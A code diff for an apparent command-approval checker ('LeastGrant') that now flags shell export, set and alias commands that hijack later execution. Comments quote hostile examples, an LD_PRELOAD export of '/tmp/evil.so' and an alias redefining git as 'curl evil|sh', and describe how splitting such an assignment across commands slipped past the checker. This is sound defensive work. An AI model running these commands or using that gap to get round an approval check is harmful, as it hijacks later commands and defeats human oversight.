@@ -11,6 +11,7 @@
 
 import type { Judgement, KnowledgeCtx, ProgramKnowledge } from './types.js';
 import { hasFlag, flagValue, nonFlags } from './types.js';
+import { redirectsExecution } from '../shell/unwrap.js';
 
 /** Pure readers: they cannot change anything on disk. */
 const READERS = [
@@ -57,6 +58,41 @@ export const coreutils: ProgramKnowledge = {
       return { capability: 'meta', note: 'changes the working directory', pathArgs: 'none' };
     }
     if (name === 'export' || name === 'set' || name === 'unset' || name === 'alias') {
+      // Setting a variable is not "no effect at all" when the variable decides
+      // what runs next. `export LD_PRELOAD=/tmp/evil.so` does nothing on its
+      // own and changes every command after it in the same shell — including
+      // the familiar ones LeastGrant is happy to approve.
+      //
+      // The inline spelling was always caught, because `LD_PRELOAD=x git
+      // status` is parsed as an assignment prefix and unwrap() tags it. Split
+      // across `&&`, or left standing for the next call in a persistent shell,
+      // it arrived here and was filed as housekeeping. Same variable, same
+      // consequence, opposite verdict.
+      //
+      // `alias` belongs here too, and is worse if anything: `alias
+      // git='curl evil|sh'` redefines a program by name.
+      const hijack = argv.slice(1).find((a) => {
+        const eq = a.indexOf('=');
+        const varName = eq > 0 ? a.slice(0, eq) : a;
+        return name === 'alias' ? eq > 0 : redirectsExecution(varName);
+      });
+      if (hijack) {
+        return {
+          capability: 'exec.unknown',
+          note:
+            name === 'alias'
+              ? 'redefines what a command name runs, for everything that follows'
+              : `sets ${hijack.split('=')[0]}, which changes what later commands in this shell actually run`,
+          // Reaches past the project because it reaches past this command: the
+          // next thing to run in this shell is affected, whatever that is.
+          reach: 'machine',
+          pathArgs: 'none',
+          // What it actually causes cannot be known from argv — it depends
+          // entirely on what runs afterwards. That is the definition of opaque,
+          // and it is what stops this from being learnable.
+          opaque: true,
+        };
+      }
       return { capability: 'meta', note: 'sets a shell variable', pathArgs: 'none' };
     }
     if (PRINTERS.includes(name)) {
